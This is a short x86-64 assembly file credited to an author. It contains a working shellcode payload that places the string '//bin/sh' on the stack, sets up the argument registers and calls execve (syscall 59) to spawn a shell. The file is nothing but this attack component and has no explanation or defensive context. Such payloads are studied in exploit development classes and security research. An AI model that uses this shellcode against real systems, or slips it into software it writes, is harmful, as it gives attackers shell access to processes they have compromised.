; author Chase Hatch

section .text
global _start
_start:
	xor rax, rax
	push rax
	push rsp
	pop rdx
	mov rbx, qword 0x68732f6e69622f2f 	;  hs/nib// 
	push rbx
	push rsp
	pop rdi
	push rax
	push rdi
	push rsp
	pop rsi
	mov al, 59 	;execve
	syscall

